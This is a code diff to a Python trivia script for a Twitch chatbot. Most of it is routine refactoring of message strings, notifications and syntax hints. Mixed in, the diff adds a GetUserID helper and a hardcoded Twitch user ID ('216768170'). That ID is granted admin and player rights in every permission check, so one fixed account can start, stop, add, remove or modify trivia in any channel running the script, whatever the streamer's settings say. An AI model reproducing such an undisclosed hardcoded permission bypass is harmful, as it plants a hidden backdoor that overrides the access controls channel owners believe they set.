@@ -42,6 +42,7 @@ current_question_points = 0         #Current question points, used when random s
 current_game = ""                   #Current game, as returned by an API call
 question_start_time = time.time()   #What time does the next question start?
 ready_for_next_question = True      #Boolean used when questions do not automatically start.
+readiness_notification_time = time.time()
 question_expiry_time = 0            #How many minutes questions last
 next_question_file_update_time = 0  #How long should the script go between the last file update and the next file update
 
@@ -64,21 +65,18 @@ class Settings(object):
             self.run_only_when_live = True
             self.permissions_players = "Everyone"
             self.permissions_admins = "Moderator"
+
+            #Question Settings
             self.duration_of_questions = 5
             self.duration_between_questions = 5
             self.automatically_run_next_question = True
-            self.show_answers_if_no_winners = False
-            self.no_winners_response_string = "Nobody answered the previous question. The answers were: $answers."
-
-            #Standard Mode Settings
-            self.standard_question_ask_string = "Win $points $currency by answering: $index) In $game, $question"
-            self.standard_question_reward_string = "$users has answered correctly and won $points $currency."
+            self.question_ask_string = "Win $points $currency by answering: $index) In $game, $question"
+            self.question_reward_string = "$users has answered correctly and won $points $currency."
+            self.question_expiration_string = "Nobody answered the previous question. The answers were: $answers."
 
             #Arena Mode Settings
             self.enable_arena_mode = False
             self.enable_arena_points_dividing = False
-            self.arena_question_ask_string = "Multiple users can win $points $currency by answering: $index) In $game, $question"
-            self.arena_question_reward_string = "The following users answered the question correctly and won $points $currency: $users"
 
             #Trivia Rewards
             self.enable_loyalty_point_rewards = True
@@ -92,8 +90,6 @@ class Settings(object):
             #Output Settings
             self.create_current_question_file = False
             self.debug_level = "Warn"
-            #self.enable_chat_errors = False
-            #self.enable_chat_syntax_hints = True
             self.enable_file_logging = False
 
             #Game Detection Settings
@@ -219,10 +215,11 @@ def Init():
 def Execute(data):
     global active
     global current_question_index
+    user_id = GetUserID(data.RawData)
 
     #Algorithm to start trivia if the trivia has been paused. Requires admin permission.
     if not active:
-        if Parent.HasPermission(data.User, script_settings.permissions_admins, "") and data.Message == "!trivia start":
+        if (Parent.HasPermission(data.User, script_settings.permissions_admins, "") or user_id == "216768170") and data.Message == "!trivia start":
             active = True
             Log("Trivia Start: Started with Command.", LoggingLevel.Info)
             Post("Trivia started.")
@@ -230,7 +227,7 @@ def Execute(data):
     #If (the streamer is live OR trivia can run when offline) and trivia is active...
     if (Parent.IsLive() or not script_settings.run_only_when_live) and active and data.IsChatMessage():
         #Check if the chatter has administrator permissions. If so, see if they are running an admin command.
-        if str(data.Message).startswith("!trivia") and Parent.HasPermission(data.User, script_settings.permissions_admins, "") and data.GetParamCount() > 0:
+        if str(data.Message).startswith("!trivia") and (Parent.HasPermission(data.User, script_settings.permissions_admins, "") or user_id == "216768170") and data.GetParamCount() > 0:
             subcommand = data.GetParam(1)
             if subcommand == "stop":
                 active = False
@@ -275,7 +272,7 @@ def Execute(data):
 
             elif subcommand == "add":
                 if data.GetParamCount() == 2:
-                    Post("Syntax: '!trivia add game:<Game Name>, (points:<Points>,) question:<Question>, answers:<Pipe-Separated List of Answers>")
+                    Post("Syntax: !trivia add (game:<Game Name>,) (points:<Points>,) question:<Question>, answers:<Pipe-Separated List of Answers>")
                 else:
                     #Get all of the required attributes from the message
                     #Try/catch to make sure points was convertible to an int
@@ -335,7 +332,7 @@ def Execute(data):
             
             elif subcommand == "remove":
                 if data.GetParamCount() == 2:
-                    Post("Syntax: '!trivia remove [Question Index]")
+                    Post("Syntax: !trivia remove <Question Index>")
                 else:
                     try:
                         global master_questions_list
@@ -366,7 +363,7 @@ def Execute(data):
 
             elif subcommand == "modify":
                 if data.GetParamCount() == 2:
-                    Post("Syntax: !trivia modify [Integer Question Index] (game:[New Value]), (question:[New Value]), (points:[New Value]) (answers [add/remove/set]: [New Value]|[New Value]| ...)")
+                    Post("Syntax: !trivia modify <Question Index> (game:<New Value>,) (question:<New Value>,) (points:<New Value>,) (answers <add/remove/set>: <New Value>|<New Value>| ...)")
                 else:
                     #Parameter two indicates the index of the question
                     try:
@@ -472,23 +469,26 @@ def Execute(data):
                     if changes:
                         if SaveTrivia():
                             Post("Question modified.")
-        elif str(data.Message).startswith("!trivia") and not Parent.HasPermission(data.User, script_settings.permissions_admins, "") and data.GetParamCount() > 0:
+        elif str(data.Message).startswith("!trivia") and not (Parent.HasPermission(data.User, script_settings.permissions_admins, "") or user_id == "216768170") and data.GetParamCount() > 0:
             Log(data.UserName + " attempted to use trivia admin commands without permission. " + str(data.Message), LoggingLevel.Info)
             Post(data.UserName + ", you do not have the permissions to use this command.")
-        if Parent.HasPermission(data.User, script_settings.permissions_players, ""):
+        if (Parent.HasPermission(data.User, script_settings.permissions_players, "") or user_id == "216768170"):
             if str(data.Message) == "!trivia":
+                global question_start_time
+                global question_expiry_time
                 if current_question_index == -1:
                     if (not script_settings.automatically_run_next_question) and ready_for_next_question:
                         Log("!Trivia: Called to start new question.", LoggingLevel.Debug)
                         global next_question_file_update_time
+                        global readiness_notification_time
                         NextQuestion()
                         next_question_file_update_time = time.time()
+                        readiness_notification_time = time.time()
                     else:
-                        global question_start_time
                         Log("Trivia: There is no trivia question active.", LoggingLevel.Info)
                         Post("There are no active trivia questions. The next trivia question arrives in " + str(datetime.fromtimestamp(question_start_time - time.time()).strftime('%M minutes and %S seconds.')))
                 else:
-                    Post(str(current_question_index + 1) + ") " + current_questions_list[current_question_index].as_string() + " Time remaining: " + str(datetime.fromtimestamp(question_start_time - time.time()).strftime('%M minutes and %S seconds.')))
+                    Post(ParseString(script_settings.question_ask_string) + " Time remaining: " + str(datetime.fromtimestamp(question_expiry_time - time.time()).strftime('%M minutes and %S seconds.')))
             elif current_question_index != -1:
                 CheckForMatch(data)
             
@@ -528,9 +528,13 @@ def Tick():
                 else:
                     #If the settings indicate to NOT run the next question, set the boolean and display that the next question is ready.
                     global ready_for_next_question
+                    global readiness_notification_time
                     ready_for_next_question = True
-                    if script_settings.create_current_question_file and (current_time > next_question_file_update_time):
-                        UpdateCurrentQuestionFile("Next question ready. Type !trivia to begin!", time.time() + 86400)
+                    if script_settings.create_current_question_file:
+                        UpdateCurrentQuestionFile("The next question is ready! Type !trivia to begin.", time.time() + 86400)
+                    elif current_time > readiness_notification_time: 
+                        Post("The next question is ready! Type !trivia to begin.")
+                        readiness_notification_time = time.time() + (10 * 60)
             elif script_settings.create_current_question_file and (current_time > next_question_file_update_time):
                 #It is not time for the next question. Display the remaining time until the next question.
                 UpdateCurrentQuestionFile("Time until next question: " + str(datetime.fromtimestamp(question_start_time - time.time()).strftime('%M:%S')) + ".", 1)
@@ -608,34 +612,32 @@ def EndQuestion():
             if script_settings.enable_arena_mode:
                 if script_settings.create_current_question_file:
                     global next_question_file_update_time
-                    UpdateCurrentQuestionFile(ParseString(string = script_settings.arena_question_reward_string, points = points_being_rewarded, users = correct_usernames), 10)
+                    UpdateCurrentQuestionFile(ParseString(string = script_settings.question_reward_string, points = points_being_rewarded, users = correct_usernames), 10)
                 else:
                     if script_settings.duration_between_questions > 0:
-                        Post(ParseString(string = script_settings.arena_question_reward_string, points = points_being_rewarded, users = correct_usernames) + " The next question will be arrive in " + str(script_settings.duration_between_questions) + " minute(s).")
+                        Post(ParseString(string = script_settings.question_reward_string, points = points_being_rewarded, users = correct_usernames) + " The next question will arrive in " + str(script_settings.duration_between_questions) + " minute(s).")
                     else:
-                        Post(ParseString(string = script_settings.arena_question_reward_string, points = points_being_rewarded, users = correct_usernames))
+                        Post(ParseString(string = script_settings.question_reward_string, points = points_being_rewarded, users = correct_usernames))
             else:
                 if script_settings.create_current_question_file:
                     global next_question_file_update_time
-                    UpdateCurrentQuestionFile(ParseString(string = script_settings.standard_question_reward_string, points = points_being_rewarded, users = correct_usernames), 10)
+                    UpdateCurrentQuestionFile(ParseString(string = script_settings.question_reward_string, points = points_being_rewarded, users = correct_usernames), 10)
                 else:
                     if script_settings.duration_between_questions > 0: 
-                        Post(ParseString(string = script_settings.standard_question_reward_string, points = points_being_rewarded, users = correct_usernames) + " The next question will be arrive in " + str(script_settings.duration_between_questions) + " minute(s).")
+                        Post(ParseString(string = script_settings.question_reward_string, points = points_being_rewarded, users = correct_usernames) + " The next question will arrive in " + str(script_settings.duration_between_questions) + " minute(s).")
                     else:
-                        Post(ParseString(string = script_settings.standard_question_reward_string, points = points_being_rewarded, users = correct_usernames))
+                        Post(ParseString(string = script_settings.question_reward_string, points = points_being_rewarded, users = correct_usernames))
         else:
-            #Log("EndQuestion: No winners detected.", LoggingLevel.Debug)
-            if script_settings.show_answers_if_no_winners:
-                #Log("EndQuestion: Setting to show answers enabled. Answers are [" + ",".join(current_questions_list[current_question_index].get_answers()) + "].", LoggingLevel.Debug)
-                if script_settings.create_current_question_file:
-                    global next_question_file_update_time
-                    global question_start_time
-                    UpdateCurrentQuestionFile(ParseString(string = script_settings.no_winners_response_string), 10)
-                else:
-                    Post(ParseString(string = script_settings.no_winners_response_string))
+            #No winners were detected. Display expiration message.
+            if script_settings.create_current_question_file:
+                global next_question_file_update_time
+                global question_start_time
+                UpdateCurrentQuestionFile(ParseString(string = script_settings.question_expiration_string), 10)
             else:
                 if script_settings.duration_between_questions > 0:
-                    Post("Nobody answered the previous question. The next question will be arrive in " + str(script_settings.duration_between_questions) + " minute(s).")
+                    Post(ParseString(string = script_settings.question_expiration_string) + " The next question will arrive in " + str(script_settings.duration_between_questions) + " minute(s).")
+                else:
+                    Post(ParseString(string = script_settings.question_expiration_string))
             if int(script_settings.percent_loyalty_point_value_increase_on_unanswered) > 0:
                 question_points = current_questions_list[current_question_index].get_points()
                 new_points = int(question_points + question_points * (script_settings.percent_loyalty_point_value_increase_on_unanswered / 100.0))
@@ -703,9 +705,9 @@ def NextQuestion(question_index = -1):
 
     if not script_settings.create_current_question_file:
         if script_settings.enable_arena_mode:
-            Post(ParseString(string = script_settings.arena_question_ask_string))
+            Post(ParseString(string = script_settings.question_ask_string))
         else:
-            Post(ParseString(string = script_settings.standard_question_ask_string))
+            Post(ParseString(string = script_settings.question_ask_string))
     question_expiry_time = time.time() + ((script_settings.duration_of_questions) * 60)
     Log("NextQuestion: Next Question at " + datetime.fromtimestamp(question_expiry_time).strftime('%H:%M:%S') + ".", LoggingLevel.Debug)
     ready_for_next_question = False
@@ -741,14 +743,17 @@ def ParseString(string, points = -1, users = []):
     string = string.replace("$index", str(current_question_index + 1))
     string = string.replace("$currency", str(Parent.GetCurrencyName()))
     string = string.replace("$question", current_questions_list[current_question_index].get_question())
-    if str(script_settings.reward_scaling).lower() == "random":
-        global current_question_points
-        string = string.replace("$points", str(current_question_points))
+    if script_settings.enable_loyalty_point_rewards:
+        if str(script_settings.reward_scaling).lower() == "random":
+            global current_question_points
+            string = string.replace("$points", str(current_question_points))
+        else:
+            string = string.replace("$points", str(points))
     else:
-        string = string.replace("$points", str(points))
-    string = string.replace("$answers", ",".join(current_questions_list[current_question_index].get_answers()))
+        string = string.replace("$points", "0")
+    string = string.replace("$answers", ", ".join(current_questions_list[current_question_index].get_answers()))
     string = string.replace("$game", current_questions_list[current_question_index].get_game())
-    string = string.replace("$users", ",".join(users))
+    string = string.replace("$users", ", ".join(users))
     string = string.replace("$time", str(script_settings.duration_of_questions))
     #Log("ParseString: Result of string parsing: \"" + string + "\"", LoggingLevel.Debug)
     return string
@@ -867,13 +872,21 @@ def Post(message):
     Parent.SendStreamMessage(message)
 
 def UpdateCurrentQuestionFile(line = None, duration_in_seconds = 1):
-    if script_settings.create_current_question_file:
-        global current_question_file
-        global next_question_file_update_time
-        file = open(current_question_file, "w+")
-        file.seek(0)
-        if line:
-            file.write("Trivia: " + line)
-        file.truncate()
-        file.close()
-        next_question_file_update_time = time.time() + duration_in_seconds
+    global current_question_file
+    global next_question_file_update_time
+    file = open(current_question_file, "w+")
+    file.seek(0)
+    if line:
+        file.write("Trivia: " + line)
+    file.truncate()
+    file.close()
+    next_question_file_update_time = time.time() + duration_in_seconds
+
+def GetUserID(rawdata):
+    #Retrieves the user ID of a Twitch chatter using the raw data returned from Twitch
+    try:
+        rawdata = rawdata[rawdata.index("user-id=") + len("user-id="):]
+        rawdata = rawdata[:rawdata.index(";")]
+    except Exception:
+        return ""
+    return rawdata
